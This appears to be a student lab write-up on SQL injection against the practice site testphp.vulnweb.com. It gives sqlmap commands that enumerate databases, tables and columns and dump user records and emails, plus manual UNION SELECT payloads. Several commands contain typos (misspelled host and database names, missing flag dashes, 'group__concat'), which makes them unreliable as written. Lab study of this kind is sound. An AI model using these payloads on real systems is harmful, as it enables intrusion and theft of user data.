SQL INJECTION ATTACK

The following are implemented the SQl Injectoin attack:

1. How would you find if a site is vulnerable to SQL injection or not?
2. Implement SQL Injection Attack and perform the following on the Test Site
3. Find the database names
4. Find the relation/table names
5. Find the attribute/column names
6. Find the records in each table

Performed the above tasks by

a. Using SQLMAP tool (In Kali Linux inside VMWare platform)

b. Manually (In the host machine itself, over a browser, via sql code injection)

3.  Step Wise output for each task (Screen Shot as well as the command for each task)

4.  Reason out what happens at each step

SCRIPT STEPS:

Exploring the functionalities of sqlmap Use inside Kali Linux installed in VMWare

1. Go to Test Site : testphp.vulnweb.com – acuart site

2. Find the records in each table Perform the above tasks by a Using SQLMAP tool as
   "sqlmap –u link –dbs"

3. Fetch the details of all tables as " sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27
   D acurat --tables"

4. Fetching the details of columns in users tables as "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27
   D acurat - T users --columns"

5. Dump command as "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27
   D acurat - T users -C adesc,aname,artist_id,--dump"

6. For email as "sqlmap -u http://testphp.vulnweb.com/artists.php?artist=1%27
   D acurat - T users -C email --dump"

7. For Manual testing as "http://testphp.vulneb.com/artists.php?artist=-1 union select
   1,2,group\_\_concat(table_name)from information_schema.tables where table_schema=database()--

8. http://testphp.vulneb.com/artists.php?artist=1 union select
   1,2,group\_\_concat(table_name)from information_schema.tables where table_schema=database()—

9. http://testphp.vulneb.com/artists.php?artist=-1 union select 1,2,group\_\_concat(uname)from users
